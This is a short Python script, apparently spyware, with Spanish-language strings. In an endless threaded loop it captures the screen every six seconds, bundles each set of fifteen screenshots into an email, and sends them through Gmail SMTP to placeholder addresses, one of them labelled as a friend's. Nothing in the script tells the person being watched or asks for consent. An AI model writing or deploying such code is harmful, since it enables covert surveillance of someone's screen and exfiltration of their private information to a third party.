from PIL import ImageGrab 
import time 
import smtplib 
import os 
import threading 
import email 
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email.mime.text import MIMEText 
from email.utils import COMMASPACE, formatdate 
from email import encoders 

ready = False 
mensaje = MIMEMultipart() 
def attachFiles(msg): 
    for i in range(15):  
        time.sleep(6) 
        extention = ".jpg" 
        filename = "cap"  
        ImageGrab.grab().save(filename+extention, "JPEG") 
        part = MIMEBase('application', "octet-stream") 
        part.set_payload( open(filename+extention,"rb").read() ) 
        encoders.encode_base64(part) 
        part.add_header('Content-Disposition',  
                        'attachment; filename="%s"' % os.path.basename(filename+str(i)+extention)) 
        msg.attach(part) 
    return msg 
         
def writeMsg():     
    while True: 
        msg = MIMEMultipart() 
        send_to = ["maildeunamigo@gmail.com","miemail@gmail.com"] 
        msg['To'] = COMMASPACE.join(send_to) 
        msg['Date'] = formatdate(localtime=True) 
        msg['Subject'] = "capturas %s" % time.clock() 
        msg.attach( MIMEText("aca van las capturas") ) 
        global mensaje 
        global ready 
        mensaje = attachFiles(msg) 
        ready = True 

def send(): 
    global ready 
    global mensaje 
    while True: 
        if ready: 
            gmail_user = 'tugemail@gmail.com' 
            gmail_pwd = 'tupass' 
            smtpserver = smtplib.SMTP("smtp.gmail.com",587) 
            smtpserver.ehlo() 
            smtpserver.starttls() 
            smtpserver.ehlo() 
            mensaje['From'] = gmail_user 
            smtpserver.login(gmail_user, gmail_pwd) 
            smtpserver.sendmail(gmail_user, mensaje['To'], mensaje.as_string()) 
            ready = False 
            smtpserver.close() 

t1 = threading.Thread(target=writeMsg) 
t1.start() 
t1.join(10) 
t2 = threading.Thread(target=send) 
t2.start() 
t2.join(10) 